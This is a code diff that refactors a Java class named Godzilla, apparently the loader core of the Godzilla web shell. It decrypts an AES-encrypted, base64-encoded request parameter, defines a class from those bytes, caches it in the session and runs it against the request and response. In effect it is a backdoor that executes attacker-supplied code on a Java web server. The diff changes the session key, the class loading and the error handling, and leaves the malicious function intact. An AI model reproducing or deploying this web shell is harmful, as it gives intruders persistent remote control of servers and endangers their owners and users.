@@ -36,12 +36,12 @@ public class Godzilla extends ClassLoader {
                 byte[] data = base64Decode(parameter);
                 data = this.x(data, false);
                 Object session = request.getClass().getMethod("getSession").invoke(request);
-                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
-                if (sessionPayload == null) {
-                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", (new Godzilla(Thread.currentThread().getContextClassLoader())).Q(data));
+                Object cache = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
+                if (cache == null) {
+                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, (new Godzilla(Thread.currentThread().getContextClassLoader())).Q(data));
                 } else {
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) sessionPayload).newInstance();
+                    Object f = ((Class<?>) cache).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
                     f.equals(data);
@@ -53,7 +53,8 @@ public class Godzilla extends ClassLoader {
                 }
                 return true;
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
         return false;
     }
@@ -62,36 +63,32 @@ public class Godzilla extends ClassLoader {
     public static String base64Encode(byte[] bs) throws Exception {
         String value = null;
         Class<?> base64;
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
         try {
-            base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
+            base64 = contextClassLoader.loadClass("java.util.Base64");
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder", true, Thread.currentThread().getContextClassLoader());
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = contextClassLoader.loadClass("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
         try {
-            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
+            base64 = contextClassLoader.loadClass("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = contextClassLoader.loadClass("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
@@ -101,22 +98,20 @@ public class Godzilla extends ClassLoader {
         return super.defineClass(cb, 0, cb.length);
     }
 
-    public byte[] x(byte[] s, boolean m) {
-        try {
-            Class<?> cipherClass = Class.forName("javax.crypto.Cipher", true, Thread.currentThread().getContextClassLoader());
-            Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec", true, Thread.currentThread().getContextClassLoader());
-            Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
-            Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
-            Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
-
-            initMethod.invoke(c, m ? 1 : 2, constructor.newInstance(key.getBytes(), "AES"));
-            Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
-            return ((byte[]) doFinalMethod.invoke(c, s));
-        } catch (Exception var4) {
-            return null;
-        }
+    @SuppressWarnings("all")
+    public byte[] x(byte[] s, boolean m) throws Exception {
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+        Class<?> cipherClass = contextClassLoader.loadClass("javax.crypto.Cipher");
+        Class<?> secretKeySpecClass = contextClassLoader.loadClass("javax.crypto.spec.SecretKeySpec");
+        Constructor<?> constructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
+        Method initMethod = cipherClass.getMethod("init", int.class, Key.class);
+        Object c = cipherClass.getMethod("getInstance", String.class).invoke(null, "AES");
+        initMethod.invoke(c, m ? 1 : 2, constructor.newInstance(key.getBytes(), "AES"));
+        Method doFinalMethod = cipherClass.getMethod("doFinal", byte[].class);
+        return ((byte[]) doFinalMethod.invoke(c, s));
     }
 
+    @SuppressWarnings("all")
     public Object unwrapRequest(Object request) {
         Object internalRequest = request;
         while (true) {
@@ -133,6 +128,7 @@ public class Godzilla extends ClassLoader {
         }
     }
 
+    @SuppressWarnings("all")
     public Object unwrapResponse(Object response) {
         Object internalResponse = response;
         while (true) {
